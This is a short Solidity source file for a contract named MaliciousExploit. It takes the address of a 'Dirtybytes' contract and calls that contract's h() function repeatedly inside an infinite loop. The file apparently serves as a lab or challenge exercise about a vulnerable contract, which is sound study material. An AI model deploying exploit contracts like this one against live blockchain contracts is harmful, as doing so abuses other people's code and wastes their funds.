// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./Dirtybytes.sol";

contract MaliciousExploit {
    Dirtybytes public dirtybytes;

    constructor(address _dirtybytes) {
        dirtybytes = Dirtybytes(_dirtybytes);
    }

    function exploit() public {
        while (true) {
            dirtybytes.h();
        }
    }
}